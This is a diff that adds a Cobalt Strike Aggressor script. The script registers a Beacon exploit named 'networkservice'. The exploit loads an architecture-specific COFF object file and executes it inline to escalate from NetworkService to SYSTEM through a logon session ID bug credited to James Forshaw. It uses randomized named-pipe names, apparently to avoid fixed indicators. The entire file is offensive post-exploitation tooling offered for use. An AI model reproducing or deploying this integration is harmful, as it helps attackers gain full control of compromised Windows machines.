@@ -1,0 +1,51 @@
+#
+# Thanks Alex. I'm too bloody lazy to 
+# do it any other way.
+#
+sub random_string {
+    $limit = $1;
+    @random_str = @();
+    $characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
+    for ($x = 0; $x < $limit; $x++) {
+        $n = rand(strlen($characters));
+        add(@random_str, charAt($characters, $n));
+    }
+    return join('', @random_str);
+};
+
+#
+# Escalates the caller to SYSTEM using the
+# Logon Session ID Bug Documented by Forshaw
+#
+sub networkservice_elevate {
+	local('$barch $handle $object $bargs');
+
+	#
+	# Opens the COFF object file using aggresor
+	# within the same directory as the current
+	# script.
+	#
+	$barch  = barch($1);
+	$handle = openf(script_resource("network. $+ $barch $+ .o"));
+	$object = readb($handle, -1);
+	closef($handle);
+
+	#
+	# Creates a random string to use as an 
+	# pipe. Avoids hardcoding string names
+	# in this case.
+	#
+	$random = random_string(12);
+	$client = "\\\\localhost\\pipe\\ $+ $random $+ ";
+	$server = "\\\\.\\pipe\\ $+ $random $+ ";
+	$bargs  = bof_pack($1, "zz", $server, $client);
+
+	#
+	# Deploy the COFF file with relocations applied
+	# to resolve the jumps.
+	#
+	btask($1, "Tasked Beacon to elevate from NetworkService to SYSTEM.");
+	beacon_inline_execute($1, $object, "NetworkServiceElevate", $bargs);
+};
+
+beacon_exploit_register("networkservice", "Uses James Forshaw's Logon Session ID Bug To Escalate from NetworkService to SYSTEM", &networkservice_elevate);
